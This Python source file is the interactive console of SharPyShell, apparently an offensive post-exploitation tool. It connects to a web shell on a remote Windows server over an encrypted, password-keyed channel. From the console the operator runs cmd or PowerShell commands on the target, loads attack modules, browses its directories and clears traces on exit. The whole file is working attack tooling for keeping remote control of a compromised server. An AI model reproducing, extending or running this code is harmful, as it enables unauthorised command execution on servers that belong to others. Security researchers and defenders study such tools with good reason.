from core import config
from cmd import Cmd
import os
import glob
import sys
import importlib
import shlex
import hashlib
import signal
import platform
from utils import prettify
from utils.normalize_args import normalize_args
from utils.random_string import random_generator
from core.Environment import Environment
from core.Request import Request


class SharPyShellPrompt(Cmd):
    # overriden properties
    doc_header = "SharPyShell Commands (type help <topic>):"
    prompt = "SharPyShellPrompt> "
    identchars = Cmd.identchars + '#'

    # new properties: modules
    online = False
    modules_loaded = {}
    modules_loaded_tree = []

    helper_commands = ['cd', 'help', 'quit', 'exit']

    def __init__(self, password, channel_enc_mode, default_shell, url, user_agent,
                 cookies, custom_headers, insecure_ssl, proxy):
        importlib.reload(sys)
        #sys.setdefaultencoding('utf8')
        password = password.encode('utf-8')
        if platform.system() == 'Windows':
            signal.signal(signal.SIGTERM, lambda s, f: self.do_quit())
        else:
            signal.signal(signal.SIGTSTP, lambda s, f: self.do_quit())
        Cmd.__init__(self)
        if channel_enc_mode == 'aes128':
            self.password = hashlib.md5(password).hexdigest()
        else:
            self.password = hashlib.sha256(password).hexdigest()
        self.channel_enc_mode = channel_enc_mode
        self.default_shell = default_shell
        request_object = Request(url, user_agent, cookies, custom_headers, insecure_ssl, proxy)
        self.env_obj = Environment(self.password, self.channel_enc_mode, request_object)
        env_dict = self.env_obj.make_env(random_generator())
        if '{{{Offline}}}' in env_dict:
            self.do_quit([env_dict])
        self.online = True
        self.modules_settings = env_dict
        self.load_modules(request_object)

    def load_modules(self, request_object):
        modules_paths = glob.glob(config.modules_paths + '[a-z]*py')
        for module_path in modules_paths:
            module_filename = module_path.split(os.sep)[-1:]
            module_name = os.path.splitext(''.join(module_filename))[0]
            classname = module_name.capitalize()
            module = __import__(
                'modules.%s' % module_name, fromlist=["*"]
            )
            # load all run classes and pass arguments to init method
            module_class = getattr(module, classname)(self.password, self.channel_enc_mode,
                                                      self.modules_settings, request_object)
            self.modules_loaded[module_name] = module_class
            self.modules_loaded_tree.append(module_name)
            setattr(SharPyShellPrompt, 'do_%s' % module_name, module_class.run)

    def precmd(self, line):
        if '"' in line:
            line = line.replace('"', '""')
        return line

    def onecmd(self, line):
        cmd, args, line = self.parseline(line)
        if not line:
            return self.emptyline()
        if cmd is None:
            return self.emptyline()
        if line == 'EOF':
            raise EOFError()
        if cmd == '':
            return self.emptyline()
        if cmd.startswith('#'):
            response = self.onecmd_custom(cmd.lstrip('#'), args)
            print (response)
            return response
        if cmd in self.helper_commands:
            func = getattr(self, 'do_' + cmd.lstrip('#'))
            return func(args)
        return self.default(line)

    def onecmd_custom(self, cmd, args):
        if cmd in self.modules_loaded_tree:
            shlex_obj = shlex.shlex(args, posix=False)
            shlex_obj.quotes = '\''
            shlex_obj.whitespace_split = True
            shlex_obj.commenters = ''
            args = list(shlex_obj)
            args = normalize_args(args)
            parsed_response = self.modules_loaded[cmd].run(args)
        else:
            parsed_response = '"#' + cmd + '" Module not found.'
        return parsed_response

    def postcmd(self, stop, line):
        working_directory = self.modules_settings['working_directory']
        if working_directory.endswith('\\') and not working_directory.endswith(':\\'):
            self.modules_settings['working_directory'] = working_directory.rstrip('\\')
        if self.default_shell == 'exec_cmd':
            self.prompt = self.modules_settings['working_directory'] + '> '
        else:
            self.prompt = 'PS ' + self.modules_settings['working_directory'] + '> '

    def do_cd(self, arg):
        """Change the current working directory."""
        working_directory = self.modules_settings['working_directory']
        if arg == "" or arg == " " or arg == '.':
            print (working_directory)
            return
        if arg == '..':
            arg = working_directory.split('\\')
            for i in range(0, len(arg)):
                if arg[i] == '':
                    del arg[i]
            del arg[len(arg) - 1]
            if len(arg) == 1:
                arg[0] = arg[0].replace(':', ':\\')
                arg = ''.join(arg)
            elif len(arg) > 0:
                arg = '\\'.join(arg)
            else:
                print ("Empty Path.")
                return
        else:
            if '/' in arg:
                arg = arg.replace('/', '\\')
            if arg.endswith(':'):
                arg = arg + '\\'
            elif ':' not in arg:
                if working_directory.endswith('\\'):
                    arg = working_directory + arg
                else:
                    arg = working_directory + '\\' + arg
        response = self.modules_loaded['exec_cmd'].run(['dir ""' + arg + '""'])
        if '{{{SharPyShellError}}}' not in response:
            self.modules_settings['working_directory'] = arg
        else:
            print (response)
        return response

    def do_help(self, arg):
        """List available commands."""
        if arg and arg.lstrip('#') in self.modules_loaded_tree:
            print (self.modules_loaded[arg.lstrip('#')].complete_help)
        else:
            print ("\n\n" + self.doc_header + "\n")
            data = [['\nCommands\n', '\nDesc\n']]
            for module_name in sorted(self.modules_loaded_tree):
                data.append(['#%s' % module_name, self.modules_loaded[module_name].short_help])
            print (prettify.tablify(data, table_border=False))
            print
            print ("\n" + "SharPyShell Helper Commands:" + "\n")
            data = [['\nCommands\n', '\nDesc\n']]
            for module_name in sorted(self.helper_commands):
                data.append(['%s' % module_name, getattr(self, 'do_'+module_name).__doc__])
            print (prettify.tablify(data, table_border=False))
            print

    def complete_help(self, text, line, start_index, end_index):
        out = ['#'+module for module in self.modules_loaded_tree if module not in self.helper_commands]
        if text:
            return [module for module in out if module.startswith(text)]
        else:
            return out

    def completenames(self, text, *ignored):
        out = ['#'+module for module in self.modules_loaded_tree if module not in self.helper_commands
               and ('#'+module).startswith(text)]
        return out

    def complete(self, text, state):
        """Return the next possible completion for 'text'.

        If a command has not been entered, then complete against command list.
        Otherwise try to call complete_<command> to get list of completions.
        """
        if state == 0:
            import readline
            old_delims = readline.get_completer_delims()
            readline.set_completer_delims(old_delims.replace('#', ''))
            origline = readline.get_line_buffer()
            line = origline.lstrip()
            stripped = len(origline) - len(line)
            begidx = readline.get_begidx() - stripped
            endidx = readline.get_endidx() - stripped
            if begidx > 0:
                cmd, args, foo = self.parseline(line)
                if cmd == '':
                    compfunc = self.completedefault
                else:
                    try:
                        compfunc = getattr(self, 'complete_' + cmd)
                    except AttributeError:
                        compfunc = self.completedefault
            else:
                compfunc = self.completenames
            self.completion_matches = compfunc(text, line, begidx, endidx)
        try:
            return self.completion_matches[state]
        except IndexError:
            return None

    def default(self, line):
        """Default command line send."""
        if not line:
            return
        result = self.modules_loaded[self.default_shell].run([line])
        if not result:
            return
        # Clean trailing newline if existent to prettify output
        result = result[:-1] if (
                isinstance(result, str) and
                result.endswith('\n')
        ) else result
        print (result)

    def cmdloop(self, intro=None):
        """Repeatedly issue a prompt, accept input, parse an initial prefix
        off the received input, and dispatch to action methods, passing them
        the remainder of the line as argument.

        """
        # Custom change: added hadling for ctrl+c
        self.preloop()
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                readline.parse_and_bind(self.completekey+": complete")
            except ImportError:
                pass
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro)+"\n")
            stop = None
            while not stop:
                try:
                    if self.cmdqueue:
                        line = self.cmdqueue.pop(0)
                    else:
                        if self.use_rawinput:
                            try:
                                line = input(self.prompt)
                            except EOFError:
                                line = 'EOF'
                        else:
                            self.stdout.write(self.prompt)
                            self.stdout.flush()
                            line = self.stdin.readline()
                            if not len(line):
                                line = 'EOF'
                            else:
                                line = line.rstrip('\r\n')
                    line = self.precmd(line)
                    stop = self.onecmd(line)
                    stop = self.postcmd(stop, line)
                except KeyboardInterrupt:
                    print("^C")
            self.postloop()
        finally:
            if self.use_rawinput and self.completekey:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except ImportError:
                    pass

    def do_quit(self, args=[]):
        """Quit the program."""
        if self.online:
            print ("\n\nQuitting...\n")
            print (self.env_obj.clear_env(self.modules_settings))
        else:
            print (args[0] + "\n\n\nTarget Offline...\n")
        raise SystemExit

    def do_exit(self, args=[]):
        """Exit the program."""
        self.do_quit()
